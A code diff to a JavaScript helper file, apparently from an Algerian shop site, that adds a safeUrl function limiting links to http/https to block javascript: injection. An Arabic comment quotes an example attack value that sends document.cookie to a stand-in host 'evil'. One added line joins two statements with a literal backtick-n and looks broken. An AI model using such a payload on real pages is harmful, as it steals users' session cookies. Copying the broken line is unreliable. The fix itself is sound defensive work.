@@ -16,6 +16,17 @@ function escapeHtml(v = "") {
 }
 
 /**
+ * لا تسمح إلا بروابط http/https.
+ * يمنع حقن `javascript:` في href — التهريب وحده لا يكفي،
+ * لأن escapeHtml لا يغيّر بروتوكول الرابط.
+ * مثال هجوم: instagram_url = "javascript:fetch('//evil/?t='+document.cookie)"
+ */
+function safeUrl(u = "") {
+  const s = String(u).trim();
+  return /^https?:\/\//i.test(s) ? s : "";
+}
+
+/**
  * Format amount as Algerian Dinar (DA)
  * Example: 1500 → "1 500 DA"
  */
@@ -60,7 +71,7 @@ function formatDateFr(dateStr, options = {}) {
 }
 
 // Expose globally (for use in inline scripts and modules)
-window.escapeHtml = escapeHtml;
+window.escapeHtml = escapeHtml;`nwindow.safeUrl = safeUrl;
 window.formatMoney = formatMoney;
 window.formatMoneyDZ = formatMoneyDZ;
 window.formatDisplayCode = formatDisplayCode;
